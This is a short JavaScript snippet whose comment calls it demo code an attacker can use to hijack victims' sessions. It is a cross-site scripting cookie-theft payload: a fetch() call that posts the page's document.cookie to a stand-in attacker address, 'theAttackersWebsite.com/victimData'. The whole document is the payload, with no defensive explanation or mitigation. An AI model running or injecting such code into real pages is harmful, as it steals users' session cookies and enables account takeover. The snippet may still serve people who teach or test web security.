// This is a demo code that malicious attacker can use against victims to hijack their sessions

fetch('theAttackersWebsite.com/victimData', {
    method: 'post',
    body: document.cookie,
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    }
})
